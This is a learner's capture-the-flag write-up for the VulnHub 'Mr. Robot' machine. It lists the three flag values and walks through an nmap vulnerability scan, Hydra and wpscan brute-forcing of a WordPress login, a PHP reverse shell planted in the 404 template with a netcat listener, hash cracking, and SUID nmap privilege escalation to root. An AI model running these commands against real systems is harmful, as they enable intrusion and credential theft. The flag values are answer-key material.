# Mr. Robot
**Completed 01/22/2023**

https://www.vulnhub.com/entry/mr-robot-1,151/

**Flags:**
1. /robots/key-1-of-3.txt: 073403c8a58a1f80d943455fb30724b9
2. /home/robot/key-2-of-3.txt: 822c73956184f694993bede3eb39f959
3. /root/key-3-of-3.txt: 04787ddef27c3dee1ee161b21670b4e4

# **Flag 1**
## nmap
- ran `nmap -sS --script vuln 10.10.1.102` to check for open ports and vulns
	- Found port 22 closed, 80 and 443 open
	- vuln script enumerated hidden dirs, led me to `/robots/`
	- found `key-1-of-3.txt` and navigated to URL to view it

## fsocity.dic 
- downloaded `fsocity.dic` which was a massive wordlist with repeated words
	- used `cat fsocity.dic | sort -u > filtered.txt` to sort the list and filter it down to unique values

# **Flag 2**
## /wp-login.php Enumeration
### Username
- other writeup obtained the POST request (wireshark?) from when they tried to login, showing that the form took the parameters `log` and `pwd`
- they then use Hydra to bruteforce the username with the command: `hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`
	- `-vV`: verbose
	- `-L fsocity.dic.uniq`: use the filtered wordliFst (filtered.txt on my box)
	- `-p wedontcare`: password doesn't matter here
	- `http-post-form`: what it is we're targeting, in this case an HTTP POST form
	- `'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'`: telling hydra where to insert the username from the list and the irrelevant password in the POST, and indicating that it is a failed attempt if the returned data contains "Invalid username"
- Once this had run, the username `elliot` was found

### Password
- wpscan could be used to search for the password using the same wordlist (filtered.txt)
	- Ran `wpscan -url http://10.10.1.102/wp-login.php -U elliot -P filtered.txt` which returned the password of `ER28-0652`

## PHP Reverse Shell
### Editing a PHP page
- Looked around the admin panel, found Editor page under Appearance
	- First page that could be edited was the 404 page, which runs a php script
	- used `locate php-re` to find a PHP Reverse Shell on the Kali install
	- edited IP value in the template to my own, set port to 443
	- copied the entire script into the 404 page editor and saved

### Using the reverse shell
- ran `netcat -lnvp 443` to listen for the reverse shell
	- triggered a 404 page to gain access
	- found password MD5 hash `robot:c3fcd3d76192e4007dfb496cca67e13b` and `key-2-of-3.txt` in `/home/robot/`
	- permission denied for key file
	- used [crackstation](https://crackstation.net) to crack hash for result of `abcdefghijklmnopqrstuvwxyz`
	
- Back in the reverse shell
	- tried `su robot` to login to that user account, returned an error saying I had to run that command from a terminal
	- ran `python -c 'import pty;pty.spawn("/bin/bash")` to get into a bash terminal
	- could then use `su robot` to login to robot account and open `key-2-of-3.txt`

# Flag 3
## Privilege Escalation
- Use `find / -perm +6000 | grep '/bin/'` to locate binaries with the su ID bit set, which may be used for privilege escalation.
	- [gtfobins](https://gtfobins.github.io) provides instructions for privilege escalation for binaries like this.
- used `nmap --version` to find that it was version 3.81, which has a privilege escalation vulnerability
	- simply run `nmap --interactive`, then use `!sh` to start a shell within the nmap interactive mode
	- run `id` or `whoami` to see that there are now root privileges
	- navigate to `/root/` to view the final flag file, `key-3-of-3.txt`


# **Lessons Learned**
- Literally this entire CTF
	- First one I've ever done
- Learned about using the vuln script with nmap for some hidden directory enumeration
- Learned a way of bruteforcing usernames on HTTP POST forms with hydra
- Learned how to bruteforce passwords on wordpress pages using wpscan
- Learned how to inject a PHP Reverse Shell anywhere that php runs and the code can be edited at an admin level
- Discovered [crackstation](https://crackstation.net) for password hash cracking
- Learned how you can use a simple python command to get a bash shell from a basic reverse shell
- Learned about the nmap 3.81 privilege escalation vulnerability and how to use it (`!sh` while in interactive mode)